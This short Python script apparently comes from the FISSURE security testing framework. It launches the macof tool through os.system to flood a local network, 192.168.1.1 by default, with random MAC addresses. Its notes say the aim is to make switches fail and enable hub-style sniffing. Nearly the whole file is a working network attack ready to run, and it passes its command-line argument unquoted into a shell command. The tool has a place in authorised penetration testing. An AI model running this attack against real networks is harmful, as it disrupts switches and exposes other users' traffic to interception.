#!/usr/bin/env python

import sys
import os


#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    destination = "192.168.1.1"    
    notes = 'Floods the local network with random MAC addresses causing some switches to fail and potentially facilitate hub style sniffing.'
    
    arg_names = ['destination','notes']
    arg_values = [destination,notes]

    return (arg_names,arg_values)
    
#################################################

if __name__ == "__main__":

    # Default Values
    destination = "192.168.1.1"  

    # Accept Command Line Arguments
    try:
        destination = sys.argv[1]
    except:
        pass

#################################################
    
    # Issue the Command  
    command_text = "sudo sudo macof -d " + destination
    os.system(command_text)














